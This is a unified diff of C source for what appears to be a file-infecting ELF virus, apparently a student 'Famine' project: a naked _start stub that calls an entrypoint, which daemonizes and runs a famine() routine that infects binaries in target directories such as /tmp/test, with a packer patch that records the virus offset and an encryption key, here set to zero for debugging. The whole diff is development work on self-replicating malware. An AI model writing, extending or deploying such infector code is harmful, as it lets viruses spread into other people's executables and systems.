@@ -16,29 +16,36 @@
 #include "daemon.h"
 #include "syscall.h"
 
+#define __asm__ __asm__ volatile
+
+typedef struct bootstrap_data_s {
+	int argc;
+	char **argv;
+	char **envp;
+} bootstrap_data_t;
+
 extern void end();
 void famine(void);
 void jmp_end(void);
-void entrypoint(void);
+//void entrypoint(void);
+void	entrypoint(int argc, char **argv, char **envp);
+void _start(void);
 
 #define JMP_SIZE 4
 
-/* 	pop	r10
-	pop	r9
-	pop	r8
-	pop	rdx
-	pop	rsi
-	pop	rdi
-	popfq
-	*/
-
-void	__attribute__((naked)) _start(void)
+void __attribute__((naked)) _start(void)
 {
-	__asm__ (".global jmp_end	\n"
-			 "call entrypoint	\n"
-			 "pop %rdx			\n"
-			 "jmp_end:			\n"
-			 "jmp end			\n");
+    __asm__ (
+        "push %rdx\n"                  // Ajout du push %rdx au début
+        "movq 8(%rsp), %rdi\n"         // Décalé de 8 octets à cause du push
+        "leaq 16(%rsp), %rsi\n"        // Décalé de 8 octets à cause du push
+        "leaq 8(%rsi,%rdi,8), %rdx\n"  // Le calcul reste le même
+        "call entrypoint\n"
+        "pop %rdx\n"                   // Premier pop (correspondant au push du début)
+        ".global jmp_end\n"
+        "jmp_end:\n"
+        "jmp end\n"
+    );
 }
 
 static int	patch_new_file(t_data *data, const char *filename) {
@@ -98,7 +105,8 @@ static void init_patch(t_data *data, size_t jmp_rel_offset) {
 
 	patch->virus_offset = addr_diff;
 
-	patch->key = gen_key_64();
+	//patch->key = gen_key_64();
+	patch->key = 0;
 }
 
 static int packer_patch(t_data *data) {
@@ -310,7 +318,9 @@ void	famine(void)
 	char host_name[PATH_MAX];
 
 	const char *paths[] = {
-		(STR("./tmp")),
+		STR("/tmp/test"),
+		STR("/tmp/test2"),
+		STR("./tmp"),
 		NULL
 	};
 
@@ -326,8 +336,27 @@ void	famine(void)
 	}
 }
 
-void	entrypoint(void)
+void print_env(char **envp)
 {
-	daemonize();
+	write(1, envp[0], ft_strlen(envp[0]));
+	for (int i = 0; envp[i] != NULL; i++) {
+		write(1, envp[i], ft_strlen(envp[i]));
+		write(1, STR("\n"), 1);
+	}
+}
+
+void	entrypoint(int argc, char **argv, char **envp)
+{
+	bootstrap_data_t bootstrap_data;
+	bootstrap_data.argc = argc;
+	bootstrap_data.argv = argv;
+	bootstrap_data.envp = envp;
+	(void)bootstrap_data;
+
+	//write(1, bootstrap_data.argv[0], ft_strlen(bootstrap_data.argv[0]));
+	//write(1, STR("\n"), 1);
+	//
+	//print_env(bootstrap_data.envp);
+	daemonize(envp);
 	famine();
 }
